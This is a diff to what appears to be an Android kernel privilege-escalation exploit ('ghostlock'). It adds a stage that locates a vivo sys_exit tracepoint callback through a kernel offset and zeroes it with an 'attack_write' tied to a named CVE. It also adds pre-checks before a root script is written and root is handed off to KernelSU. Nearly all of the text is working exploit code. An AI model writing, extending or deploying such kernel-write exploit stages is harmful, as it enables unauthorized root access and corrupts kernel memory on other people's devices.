@@ -417,6 +417,24 @@ namespace ghostlock::session::backend {
                 support::run_state::complete("w1a");
                 support::run_state::complete("w1b");
             }
+            /* The opt-in target is validated before W1. Keep this before task
+             * discovery/W2 and before any KernelSU registration. No callback
+             * storage is freed here; existing RCU readers retain its lifetime.
+             * The profile and device gate document the shared-hook effect. */
+            if (const auto offset = session.profile.vivo_sys_exit_offset()) {
+                const uintptr_t target = session.addresses.data_alias(
+                    kernel::KIMAGE_TEXT_BASE + *offset);
+                if (!attack::in_direct_map(target)) {
+                    pr_warning("W1c: vivo sys_exit target is outside the direct map\n");
+                    return StageResult::Failed;
+                }
+                const auto request = memory::WriteRequest::make(target, memory::WriteMode::Zero, true);
+                if (!Cve2026_43499Policy::template attack_write<M>(session, request, "W1c: vr sys_exit")) {
+                    pr_warning("W1c: vivo sys_exit route failed; refusing root handoff\n");
+                    return StageResult::Failed;
+                }
+                pr_success("W1c: vivo sys_exit route completed; callback readback unavailable\n");
+            }
             return StageResult::Continue;
         }
     } // namespace
@@ -449,6 +467,14 @@ namespace ghostlock::session::backend {
             pr_warning("KernelSU already has root; skipping exploit "
                 "(cold boot for a clean run, or enable the forced test)\n");
             return StageResult::Done;
+        }
+        if (!session.profile.vivo_sys_exit_offset_valid()) {
+            pr_warning("invalid offset.sys_exit_tp_funcs; refusing before W1\n");
+            return StageResult::Failed;
+        }
+        if (session.profile.vivo_sys_exit_offset() && kernelsu_module_visible()) {
+            pr_warning("KernelSU module already loaded; refusing vivo callback write\n");
+            return StageResult::Failed;
         }
         attack::write_root_script();
 
